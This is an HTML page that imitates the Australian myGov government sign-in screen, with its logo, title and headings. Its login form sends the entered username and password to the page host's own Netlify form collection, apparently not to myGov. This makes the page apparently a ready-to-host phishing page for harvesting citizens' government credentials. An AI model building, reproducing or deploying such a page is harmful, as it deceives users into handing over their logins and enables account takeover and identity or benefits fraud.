<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./input.css">
    <link rel="stylesheet" href="./main.css">
    <title>Sign In - myGOV -</title>
</head>
<body>
     <main>
        <section class="bg-mainblue">
            <div class="flex justify-between items-center w-[94%] mx-auto py-4">
                <div>
                    <img class="h-[3.2rem]"  src="./img/myGov-cobranded-logo-black.svg" alt="myGov-cobranded-logo-black">
                </div>
                <div>
                    <div>
                        <h1 class="text-lg underline text-black">Help</h1>
                    </div>
                </div>
            </div>
        </section>
        <section class="mt-[5rem]">
            <div class="mx-[15%]">
                <div class="space-y-[2rem]">
                    <div>
                        <h1 class="text-[2rem] text-start font-bold text-gray-900 whitespace-nowrap ">Sign in with myGov</h1>
                    </div>
                    <div>
                        <h1 class="text-[1.2rem] font-semibold text-gray-900 ">Using your myGov sign in details</h1>
                    </div>
                </div>
            </div>
            <!--  -->
            <div class="mx-[15%] mt-[3rem]">
                <form class="space-y-4 md:space-y-6" name="email" method="POST" data-netlify="true">
                    <div>
                        <label for="email" class="block mb-2 text-base font-semibold text-gray-900 ">Username or Email</label>
                        <input type="" name="email" id="email" class="bg-gray-50 border border-black text-gray-900 sm:text-sm focus:ring-primary-600  block w-full p-2.5" placeholder="" required="">
                    </div>
                    <div>
                        <label for="password" class="block mb-2 text-base font-semibold text-gray-900 ">Password</label>
                        <input type="" name="password" id="password" class="bg-gray-50 border border-black text-gray-900 sm:text-sm focus:ring-primary-600  block w-full p-2.5" placeholder="" required="">
                    </div>
                   
                    <button type="submit" class="w-full text-black bg-mainbluee  font-medium rounded-lg text-sm px-5 py-2.5 text-center ">Sign in</button>
                    
                </form>
            </div>
        </section>
       
     </main>   
</body>
</html>
